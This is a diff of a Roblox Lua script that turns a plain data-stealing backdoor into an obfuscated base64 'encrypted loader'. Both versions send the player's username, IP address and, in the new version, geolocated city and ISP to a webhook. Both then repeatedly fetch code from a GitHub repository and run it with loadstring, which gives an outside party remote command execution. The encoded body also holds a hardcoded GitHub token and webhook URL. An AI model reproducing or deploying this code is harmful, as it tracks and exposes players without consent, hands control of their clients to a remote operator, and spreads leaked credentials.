@@ -1,68 +1,33 @@
--- [[ PHANTOM ENGINE: RESTORED FULL INFO ]]
-local LP = game:GetService("Players").LocalPlayer
-local HS = game:GetService("HttpService")
-local US = game:GetService("UserInputService")
-local GS = game:GetService("GuiService")
-local RunService = game:GetService("RunService")
-local MS = game:GetService("MarketplaceService")
+-- [[ 2026 ENCRYPTED LOADER ]]
+local encoded_body = "CmxvY2FsIEdJVEhVQl9UT0tFTiA9ICJnaHBfdGZCdklXRVZsY29nZjUyQTVRQktid2tYY2dtenpINDQyTlYyIiAKbG9jYWwgV0VCSE9PSyA9ICJodHRwczovL3dlYmhvb2subGV3aXNha3VyYS5tb2UvYXBpL3dlYmhvb2tzLzE0OTc2NDMyMTQxNzY1MTgxOTcvVmFydkgwLXd1VXVQTXdmUFhaUDIzTG9PbXFid2NCM3FtcTNOS2hDS1VUSURyUVZDLU1IU3ZRNE9yN0t5NkhqMVR4eUMiCmxvY2FsIEFQSV9VUkwgPSAiaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy90aGVnb29kb25lYXRnYW1lei9jb21tYW5kZXIvY29udGVudHMvY29tbWFuZHMubHVhIgoKbG9jYWwgaHMgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgcCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllciBvciBnYW1lLlBsYXllcnMuUGxheWVyQWRkZWQ6V2FpdCgpCmxvY2FsIG1zID0gZ2FtZTpHZXRTZXJ2aWNlKCJNYXJrZXRwbGFjZVNlcnZpY2UiKQoKLS0gMS4gRlVMTCBESUFHTk9TVElDIFNFUVVFTkNFCmxvY2FsIGZ1bmN0aW9uIHJ1bkRpYWdub3N0aWNzKCkKICAgIHdhcm4oIvCfk6EgW0RJQUddOiBTdGFydGluZyBmdWxsIHN5c3RlbSByZXBvcnQuLi4iKQogICAgbG9jYWwgaXAsIGdlbyA9ICJOL0EiLCB7fQogICAgCiAgICBwY2FsbChmdW5jdGlvbigpIGlwID0gZ2FtZTpIdHRwR2V0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSBlbmQpCiAgICBwY2FsbChmdW5jdGlvbigpIGdlbyA9IGhzOkpTT05EZWNvZGUoZ2FtZTpIdHRwR2V0KCJodHRwOi8vaXAtYXBpLmNvbS9qc29uLyIuLmlwLi4iP2ZpZWxkcz1zdGF0dXMsbWVzc2FnZSxjb3VudHJ5LHJlZ2lvbk5hbWUsY2l0eSxpc3AsYXMiKSkgZW5kKQoKICAgIGxvY2FsIGlzUHJlbWl1bSA9IChwLk1lbWJlcnNoaXBUeXBlID09IEVudW0uTWVtYmVyc2hpcFR5cGUuUHJlbWl1bSkKICAgIGxvY2FsIGdhbWVJbmZvID0gcGNhbGwoZnVuY3Rpb24oKSByZXR1cm4gbXM6R2V0UHJvZHVjdEluZm8oZ2FtZS5QbGFjZUlkKSBlbmQpIGFuZCBtczpHZXRQcm9kdWN0SW5mbyhnYW1lLlBsYWNlSWQpIG9yIHtOYW1lID0gIlVua25vd24ifQogICAgCiAgICBsb2NhbCBwYXlsb2FkID0gewogICAgICAgIFsiZW1iZWRzIl0gPSB7ewogICAgICAgICAgICBbInRpdGxlIl0gPSAi8J+boO+4jyBTeXN0ZW0gRGlhZ25vc3RpYzogIiAuLiBwLk5hbWUsCiAgICAgICAgICAgIFsiY29sb3IiXSA9IDB4MmIyZDMxLAogICAgICAgICAgICBbImZpZWxkcyJdID0gewogICAgICAgICAgICAgICAge1sibmFtZSJdID0gIvCfkaQgVXNlciIsIFsidmFsdWUiXSA9IHN0cmluZy5mb3JtYXQoIioqJXMqKiAoJXMpXG5BZ2U6ICVzIGRheXNcblByZW1pdW06ICVzIiwgcC5OYW1lLCBwLkRpc3BsYXlOYW1lLCBwLkFjY291bnRBZ2UsIHRvc3RyaW5nKGlzUHJlbWl1bSkpLCBbImlubGluZSJdID0gdHJ1ZX0sCiAgICAgICAgICAgICAgICB7WyJuYW1lIl0gPSAi8J+MkCBOZXR3b3JrIiwgWyJ2YWx1ZSJdID0gc3RyaW5nLmZvcm1hdCgiKipJUDoqKiAlc1xuKipJU1A6KiogJXNcbioqTG9jOioqICVzLCAlcyIsIGlwLCBnZW8uaXNwIG9yICJOL0EiLCBnZW8uY2l0eSBvciAiTi9BIiwgZ2VvLmNvdW50cnkgb3IgIk4vQSIpLCBbImlubGluZSJdID0gdHJ1ZX0sCiAgICAgICAgICAgICAgICB7WyJuYW1lIl0gPSAi8J+OriBTZXNzaW9uIiwgWyJ2YWx1ZSJdID0gc3RyaW5nLmZvcm1hdCgiKipHYW1lOioqICVzXG4qKlBsYWNlIElEOioqICVzXG4qKkpvYiBJRDoqKiAlcyIsIGdhbWVJbmZvLk5hbWUsIGdhbWUuUGxhY2VJZCwgZ2FtZS5Kb2JJZCksIFsiaW5saW5lIl0gPSBmYWxzZX0sCiAgICAgICAgICAgICAgICB7WyJuYW1lIl0gPSAi8J+UlyBMaW5rcyIsIFsidmFsdWUiXSA9IHN0cmluZy5mb3JtYXQoIltQcm9maWxlXShodHRwczovL3d3dy5yb2Jsb3guY29tL3VzZXJzLyVzL3Byb2ZpbGUpIHwgW1NlcnZlcl0oaHR0cHM6Ly93d3cucm9ibG94LmNvbS9nYW1lcy8lcz9qb2JJZD0lcykiLCBwLlVzZXJJZCwgZ2FtZS5QbGFjZUlkLCBnYW1lLkpvYklkKSwgWyJpbmxpbmUiXSA9IGZhbHNlfQogICAgICAgICAgICB9LAogICAgICAgICAgICBbInRpbWVzdGFtcCJdID0gb3MuZGF0ZSgiISVZLSVtLSVkVCVIOiVNOiVTWiIpCiAgICAgICAgfX0KICAgIH0KCiAgICBsb2NhbCByZXEgPSAoc3luIGFuZCBzeW4ucmVxdWVzdCkgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkgb3IgaHR0cF9yZXF1ZXN0IG9yIHJlcXVlc3QKICAgIGlmIHJlcSB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICByZXEoewogICAgICAgICAgICAgICAgVXJsID0gV0VCSE9PSywKICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICAgICAgICAgIEhlYWRlcnMgPSB7WyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIn0sCiAgICAgICAgICAgICAgICBCb2R5ID0gaHM6SlNPTkVuY29kZShwYXlsb2FkKQogICAgICAgICAgICB9KQogICAgICAgIGVuZCkKICAgIGVuZAplbmQKCi0tIDIuIEhFTFBFUlMgKEJhc2U2NCAmIFplcm8tU3RyaXApCmxvY2FsIGI9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8nCmxvY2FsIGZ1bmN0aW9uIGRlY29kZShkYXRhKQogICAgZGF0YSA9IHN0cmluZy5nc3ViKGRhdGEsICdbXicuLmIuLic9XScsICcnKQogICAgcmV0dXJuIChkYXRhOmdzdWIoJy4nLCBmdW5jdGlvbih4KQogICAgICAgIGlmICh4ID09ICc9JykgdGhlbiByZXR1cm4gJycgZW5kCiAgICAgICAgbG9jYWwgcixmPScnLChiOmZpbmQoeCktMSkKICAgICAgICBmb3IgaT02LDEsLTEgZG8gcj1yLi4oZiUyXmktZiUyXihpLTEpPjAgYW5kICcxJyBvciAnMCcpIGVuZAogICAgICAgIHJldHVybiByOwogICAgZW5kKTpnc3ViKCclZCVkJWQlZCVkJWQlZCVkJywgZnVuY3Rpb24oeCkKICAgICAgICBsb2NhbCBjPTAKICAgICAgICBmb3IgaT0xLDggZG8gYz1jKyh4OnN1YihpLGkpPT0nMScgYW5kIDJeKDgtaSkgb3IgMCkgZW5kCiAgICAgICAgcmV0dXJuIHN0cmluZy5jaGFyKGMpCiAgICBlbmQpKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGNsZWFuU2NyaXB0KHN0cikKICAgIHJldHVybiBzdHJpbmcuZ3N1YihzdHIsICIwKyQiLCAiIikKZW5kCgotLSAzLiBNQUlOIEVYRUNVVElPTgpydW5EaWFnbm9zdGljcygpCndhcm4oIvCfmoAgWzY3LUVOR0lORV06IE9ubGluZS4gUG9sbGluZyBldmVyeSAycy4uLiIpCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICBsb2NhbCByZXEgPSAoc3luIGFuZCBzeW4ucmVxdWVzdCkgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkgb3IgaHR0cF9yZXF1ZXN0IG9yIHJlcXVlc3QKICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgcmV0dXJuIHJlcSh7CiAgICAgICAgICAgICAgICBVcmwgPSBBUElfVVJMIC4uICI/dD0iIC4uIG9zLnRpbWUoKSAuLiAiJnJkbT0iIC4uIG1hdGgucmFuZG9tKDEsMTAwMDApLAogICAgICAgICAgICAgICAgTWV0aG9kID0gIkdFVCIsCiAgICAgICAgICAgICAgICBIZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgIFsiQXV0aG9yaXphdGlvbiJdID0gIkJlYXJlciAiIC4uIEdJVEhVQl9UT0tFTiwKICAgICAgICAgICAgICAgICAgICBbIkFjY2VwdCJdID0gImFwcGxpY2F0aW9uL3ZuZC5naXRodWIranNvbiIsCiAgICAgICAgICAgICAgICAgICAgWyJDYWNoZS1Db250cm9sIl0gPSAibm8tY2FjaGUiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kKQoKICAgICAgICBpZiBzdWNjZXNzIGFuZCByZXNwb25zZS5TdGF0dXNDb2RlID09IDIwMCB0aGVuCiAgICAgICAgICAgIGxvY2FsIHMyLCBkYXRhID0gcGNhbGwoaHMuSlNPTkRlY29kZSwgaHMsIHJlc3BvbnNlLkJvZHkpCiAgICAgICAgICAgIGlmIHMyIGFuZCBkYXRhIGFuZCBkYXRhLmNvbnRlbnQgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgcmF3RGVjb2RlZCA9IGRlY29kZShkYXRhLmNvbnRlbnQ6Z3N1YigiJXMrIiwgIiIpKQogICAgICAgICAgICAgICAgbG9jYWwgZmluYWxDb2RlID0gY2xlYW5TY3JpcHQocmF3RGVjb2RlZCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gTG91ZCBQcmludAogICAgICAgICAgICAgICAgcHJpbnQoIvCfk6EgW1BPTExdOiBTZWVpbmcgLT4gIiAuLiB0b3N0cmluZyhmaW5hbENvZGUpKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBmaW5hbENvZGUgfj0gIm5vbmUiIGFuZCBmaW5hbENvZGUgfj0gIiIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmMsIGVyciA9IGxvYWRzdHJpbmcoZmluYWxDb2RlKQogICAgICAgICAgICAgICAgICAgIGlmIGZ1bmMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB3YXJuKCLimqEgW0VYRUNVVElOR10uLi4iKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmMpCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB3YXJuKCLinYwgW0xVQVUgRVJSXTogIiAuLiB0b3N0cmluZyhlcnIpKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgyKQogICAgZW5kCmVuZCkK"
 
--- CONFIG
-local RAW_URL = "https://raw.githubusercontent.com/thegoodoneatgamez/commander/refs/heads/main/commands.lua"
-local WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1497643214176518197/VarvH0-wuUuPMwfPXZP23LoOmqbwcB3qmq3NKhCKUTIDrQVC-MHSvQ4Or7Ky6Hj1TxyC"
+-- The Engine's Internal Decoder
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local function decode(data)
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d%d%d%d%d%d', function(x)
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
 
--- 1. THE FULL INFO PAGE (Fires Immediately)
-task.spawn(function()
-    local ip = "Unknown"
-    pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
-
-    local fps = math.floor(1 / RunService.Heartbeat:Wait())
-    local ping = math.floor(LP:GetNetworkPing() * 1000)
-    local res = GS:GetScreenResolution()
-    
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "🚨 SYSTEM LIVE: " .. LP.Name,
-            ["color"] = 0x00FF00,
-            ["description"] = "👤 **Identity**\n" ..
-                "**User:** " .. LP.Name .. " (@" .. LP.DisplayName .. ")\n" ..
-                "**ID:** " .. LP.UserId .. "\n" ..
-                "**Age:** " .. LP.AccountAge .. " Days\n\n" ..
-                "📊 **Performance**\n" ..
-                "**FPS:** " .. fps .. " | **Ping:** " .. ping .. "ms\n" ..
-                "**Res:** " .. math.floor(res.X) .. "x" .. math.floor(res.Y) .. "\n\n" ..
-                "🌐 **Network**\n" ..
-                "**IP:** " .. ip .. "\n\n" ..
-                "🎮 **Environment**\n" ..
-                "**Place:** " .. MS:GetProductInfo(game.PlaceId).Name .. "\n" ..
-                "**JobId:** \n`" .. game.JobId .. "`"
-        }}
-    }
-
-    local req = (syn and syn.request) or (http and http.request) or http_request or request
-    if req then
-        req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HS:JSONEncode(data)})
+-- Decrypt and Boot
+local success, result = pcall(function()
+    local decoded = decode(encoded_body)
+    local func = loadstring(decoded)
+    if func then
+        task.spawn(func)
     else
-        pcall(function() HS:PostAsync(WEBHOOK, HS:JSONEncode(data)) end)
+        error("Failed to load decrypted bytecode.")
     end
 end)
 
--- 2. THE 10-SECOND BUFFER
-task.wait(10)
-
--- 3. THE COMMAND LOOP (Cache-Bust Version)
-local lastCode = ""
-while true do
-    local cacheBuster = "?t=" .. os.time() .. "&rand=" .. math.random(1, 100000)
-    local s, code = pcall(function() 
-        return game:HttpGet(RAW_URL .. cacheBuster) 
-    end)
-    
-    if s and code ~= lastCode and code ~= "" and code ~= "none" then
-        lastCode = code
-        local taskFunc = loadstring(code)
-        if taskFunc then
-            task.spawn(taskFunc)
-        end
-    end
-    task.wait(10)
+if not success then
+    warn("🔒 [LOADER]: Boot failure. Check encoding.")
 end
